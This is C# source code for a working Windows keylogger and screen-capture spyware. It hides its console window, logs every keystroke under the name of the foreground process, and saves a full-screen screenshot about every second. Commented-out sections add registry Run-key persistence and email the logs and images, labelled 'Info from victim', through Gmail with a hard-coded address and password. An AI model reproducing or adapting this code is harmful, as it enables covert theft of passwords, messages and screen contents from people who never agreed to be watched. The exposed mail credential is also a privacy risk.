using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;
using System.Windows.Input;
using static System.Net.Mime.MediaTypeNames;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.ProgressBar;

namespace KeyLogger
{
    class Program
    {

        #region Key board
        private static string logName = "Log_";
        private static string logExtendtion = ".txt";
        static bool isStarted = true;

        private static HashSet<Key> PressedKeysHistory = new HashSet<Key>();
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);

        static string path = "keystrokes.txt";
        static string activeProcessName = GetActiveWindowProcessName().ToLower();
        static string prevProcessName = activeProcessName;
        static Thread th_doKeylogger;

        public static void initClientKeylogger()
        {
            //timer.Elapsed += new ElapsedEventHandler(onTimedEvent);

            /*
            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {
                    sw.WriteLine("\r\n[--" + activeProcessName + "--]");
                    sw.Close();
                }
            }
            */

            th_doKeylogger = new Thread(new ThreadStart(DoKeylogger));
            th_doKeylogger.SetApartmentState(ApartmentState.STA);
            th_doKeylogger.Start();
        }
        public static void StartKeylogger()
        {
            isStarted = true;
            Console.WriteLine("Keylogger started.");
        }
        public static void StopKeylogger()
        {
            if (File.Exists("keystrokes.txt"))
            {
                try
                {
                    File.Delete("keystrokes.txt");
                }
                catch (Exception)
                {
                    Console.WriteLine("unable to delete keystrokes.txt");
                }
            }
            isStarted = false;
            Console.WriteLine("Keylogger stopped.");
        }
        static bool isHotKey = false;
        static bool isShowing = false;
        static void checkHotKey(String s)
        {
            if (s.Equals("[ESC]"))
                isHotKey = true;

            if (isHotKey)
            {
                if (!isShowing)
                {
                    DisplayWindow();
                }
                else
                    HideWindow();

                isShowing = !isShowing;
            }
            isHotKey = false;
        }
        private static void DoKeylogger()
        {
            while (true)
            {

                Thread.Sleep(5);
                if (!isStarted) continue;
                string keyPressed = GetNewPressedKeys();
                Console.Write(keyPressed);
                checkHotKey(keyPressed);
                string logNameToWrite = logName + DateTime.Now.ToLongDateString() + logExtendtion;
                //StreamWriter sw = new StreamWriter(logNameToWrite, true);
                //using (StreamWriter sw = File.AppendText(path))
                using (StreamWriter sw = new StreamWriter(logNameToWrite, true))
                {
                    activeProcessName = GetActiveWindowProcessName().ToLower();
                    if (activeProcessName == "idle" || activeProcessName == "explorer") continue;
                    bool isOldProcess = activeProcessName.Equals(prevProcessName);
                    if (!isOldProcess && !(string.IsNullOrEmpty(keyPressed)) )
                    {
                        sw.WriteLine("\n[--" + activeProcessName + "--]");
                        prevProcessName = activeProcessName;
                    }
                    sw.Write(keyPressed);
                    sw.Close();
                }
            }
        }
        private static string GetNewPressedKeys()
        {
            string pressedKey = String.Empty;

            foreach (int i in Enum.GetValues(typeof(Key)))
            {
                Key key = (Key)Enum.Parse(typeof(Key), i.ToString());
                bool down = false;
                if (key != Key.None)
                {
                    down = Keyboard.IsKeyDown(key);
                }

                if (!down && PressedKeysHistory.Contains(key))
                    PressedKeysHistory.Remove(key);
                else if (down && !PressedKeysHistory.Contains(key)) //If the key is pressed, but wasn't pressed before - save it
                {

                    if (!isCaps())
                    {
                        PressedKeysHistory.Add(key);
                        pressedKey = key.ToString().ToLower(); //by default it is CAPS
                    }
                    else
                    {
                        PressedKeysHistory.Add(key);
                        pressedKey = key.ToString(); //CAPS
                    }

                }
            }
            return replaceStrings(pressedKey);
        }
        private static string replaceStrings(string input)
        {
            string replacedKey = input;
            switch (input)
            {
                case "space":
                case "Space":
                    replacedKey = " ";
                    break;
                case "return":
                    replacedKey = "\r\n";
                    break;
                case "escape":
                    replacedKey = "[ESC]";
                    break;
                case "leftctrl":
                    replacedKey = "[CTRL]";
                    break;
                case "rightctrl":
                    replacedKey = "[CTRL]";
                    break;
                case "RightShift":
                case "rightshift":
                    replacedKey = "";
                    break;
                case "LeftShift":
                case "leftshift":
                    replacedKey = "";
                    break;
                case "back":
                    replacedKey = "[Back]";
                    break;
                case "lWin":
                    replacedKey = "[WIN]";
                    break;
                case "tab":
                    replacedKey = "[Tab]";
                    break;
                case "Capital":
                    replacedKey = "";
                    break;
                case "oemperiod":
                    replacedKey = ".";
                    break;
                case "D1":
                    replacedKey = "!";
                    break;
                case "D2":
                    replacedKey = "@";
                    break;
                case "oemcomma":
                    replacedKey = ",";
                    break;
                case "oem1":
                    replacedKey = ";";
                    break;
                case "Oem1":
                    replacedKey = ":";
                    break;
                case "oem5":
                    replacedKey = "\\";
                    break;
                case "oemquotes":
                    replacedKey = "'";
                    break;
                case "OemQuotes":
                    replacedKey = "\"";
                    break;
                case "oemminus":
                    replacedKey = "-";
                    break;
                case "delete":
                    replacedKey = "[DEL]";
                    break;
                case "oemquestion":
                    replacedKey = "/";
                    break;
                case "OemQuestion":
                    replacedKey = "?";
                    break;
            }

            return replacedKey;
        }

        private static bool isCaps()
        {
            bool isCapsLockOn = Control.IsKeyLocked(Keys.CapsLock);
            bool isShiftKeyPressed = (Keyboard.Modifiers & ModifierKeys.Shift) == ModifierKeys.Shift;
            if (isCapsLockOn || isShiftKeyPressed) return true;
            else return false;
        }

        private static string GetActiveWindowProcessName()
        {
            IntPtr windowHandle = GetForegroundWindow();
            GetWindowThreadProcessId(windowHandle, out uint processId);
            Process process = Process.GetProcessById((int)processId);
            return process.ProcessName;
        }

        #endregion

        #region Capture
        static string imagePath = "Image_";
        static string imageExtendtion = ".png";

        static int imageCount = 0;
        static int captureTime = 1000; //10s 1 lần

        static void CaptureScreen()
        {
            //Create a new bitmap.
            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                           Screen.PrimaryScreen.Bounds.Height,
                                           PixelFormat.Format32bppArgb);

            // Create a graphics object from the bitmap.
            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

            // Take the screenshot from the upper left corner to the right bottom corner.
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                        Screen.PrimaryScreen.Bounds.Y,
                                        0,
                                        0,
                                        Screen.PrimaryScreen.Bounds.Size,
                                        CopyPixelOperation.SourceCopy);

            string directoryImage = imagePath + DateTime.Now.ToLongDateString();

            if (!Directory.Exists(directoryImage))
            {
                Directory.CreateDirectory(directoryImage);
            }
            // Save the screenshot to the specified path that the user has chosen.
            string imageName = string.Format("{0}\\{1}{2}", directoryImage, DateTime.Now.ToLongDateString() + "_" + imageCount, imageExtendtion);

            try
            {
                bmpScreenshot.Save(imageName, ImageFormat.Png);
            }
            catch
            {

            }
            imageCount++;
        }

        #endregion

        #region Timer
        static int interval = 1;
        static void StartTimmer()
        {
            Thread thread = new Thread(() => {
                while (true)
                {
                    Thread.Sleep(1);

                    if (interval % captureTime == 0)
                        CaptureScreen();

                    //if (interval % mailTime == 0)
                    //    SendMail();

                    interval++;

                    if (interval >= 1000000)
                        interval = 0;
                }
            });
            thread.IsBackground = true;
            thread.Start();
        }
        #endregion

        #region Windows
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        // hide window code
        const int SW_HIDE = 0;

        // show window code
        const int SW_SHOW = 5;

        static void HideWindow()
        {
            IntPtr console = GetConsoleWindow();
            ShowWindow(console, SW_HIDE);
        }

        static void DisplayWindow()
        {
            IntPtr console = GetConsoleWindow();
            ShowWindow(console, SW_SHOW);
        }
        #endregion

        #region Registry that open with window
        //static void StartWithOS()
        //{
        //    RegistryKey regkey = Registry.CurrentUser.CreateSubKey("Software\\ListenToUser");
        //    RegistryKey regstart = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
        //    string keyvalue = "1";
        //    try
        //    {
        //        regkey.SetValue("Index", keyvalue);
        //        regstart.SetValue("ListenToUser", System.Windows.Forms.Application.StartupPath + "\\" + System.Windows.Forms.Application.ProductName + ".exe");
        //        regkey.Close();
        //    }
        //    catch (System.Exception ex)
        //    {
        //    }
        //}
        #endregion

        /*
        #region Mail
        static int mailTime = 5000;
        static void SendMail()
        {
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");

                mail.From = new MailAddress("nhatbien2003@gmail.com");
                mail.To.Add("biennhat2k3a@gmail.com");
                mail.Subject = "Keylogger date: " + DateTime.Now.ToLongDateString();
                mail.Body = "Info from victim\n";

                string logFile = logName + DateTime.Now.ToLongDateString() + logExtendtion;

                if (File.Exists(logFile))
                {
                    StreamReader sr = new StreamReader(logFile);
                    mail.Body += sr.ReadToEnd();
                    sr.Close();
                }
                string directoryImage = imagePath + DateTime.Now.ToLongDateString();
                DirectoryInfo image = new DirectoryInfo(directoryImage);

                foreach (FileInfo item in image.GetFiles("*.png"))
                {
                    if (File.Exists(directoryImage + "\\" + item.Name))
                        mail.Attachments.Add(new Attachment(directoryImage + "\\" + item.Name));
                }
                SmtpServer.Port = 587;
                SmtpServer.Credentials = new System.Net.NetworkCredential("nhatbien2003@gmail.com", "gmbsumtdaftisnoe");
                SmtpServer.EnableSsl = true;

                SmtpServer.Send(mail);
                Console.WriteLine("Send mail!");

                // phải làm cái này ở mail dùng để gửi phải bật lên
                // https://www.google.com/settings/u/1/security/lesssecureapps
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }
        #endregion
        */
        static void Main(string[] args)
        {
            // StartWithOS();
            HideWindow();
            initClientKeylogger();
            StartTimmer();
        }
    }
}
